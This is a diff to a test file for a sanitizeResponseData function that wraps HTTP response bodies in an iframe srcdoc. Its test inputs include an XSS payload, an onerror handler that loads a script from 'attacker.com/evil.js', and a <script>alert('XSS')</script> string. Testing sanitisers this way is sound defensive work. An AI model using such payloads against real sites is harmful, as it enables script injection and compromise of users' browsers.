@@ -45,17 +45,22 @@ describe('configuredOutputs', () => {
 describe('sanitizeResponseData', () => {
 	test.each([
 		{
-			src: 'https://example.com',
+			srcdoc: 'https://example.com',
 		},
 		{
-			src: "<source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
+			srcdoc:
+				"<source onerror=\"s=document.createElement('script');s.srcdoc='http://attacker.com/evil.js';document.body.appendChild(s);\">",
 		},
 		{
-			src: "<div>Test with  'single quote'</div>",
+			srcdoc: "<div>Test with  'single quote'</div>",
 		},
-	])('wraps the response body in an iframe', ({ src }) => {
-		const result = sanitizeResponseData(src, true);
-		const singleQuoteReplaced = replaceSingleQuotes(src);
+		{
+			srcdoc:
+				"John's company \"TechCorp & Associates\" announced: 'We're launching a revolutionary product at €1,299.99 — it's 50% faster than competitors!' The CEO said, \"This isn't just an upgrade; it's a complete transformation.\" Users praised the app's ability to handle complex data like <script>alert('XSS')</script> and symbols such as @, #, $, %, ^, &, *, (, ), [, ], {, }, |, , /, ?, <, >, ~, `, +, =, -, _, and even emojis like 🚀 & 💡. The product description reads: \"It supports UTF-8 encoding, handles apostrophes in names like O'Connor & D'Angelo, processes mathematical expressions like 2 < 5 > 1, and manages URLs such as https://example.com/path?param=value&other='test'. We've tested it with HTML entities like &amp;, &lt;, &gt;, &quot;, &#39;, and even complex strings like `console.log(\"Hello 'World'!\");`\" — truly impressive!",
+		},
+	])('wraps the response body in an iframe', ({ srcdoc }) => {
+		const result = sanitizeResponseData(srcdoc, true);
+		const singleQuoteReplaced = replaceSingleQuotes(srcdoc);
 
 		expect(result).toContain('<iframe');
 		expect(result).toContain(`srcdoc='${singleQuoteReplaced}'`);
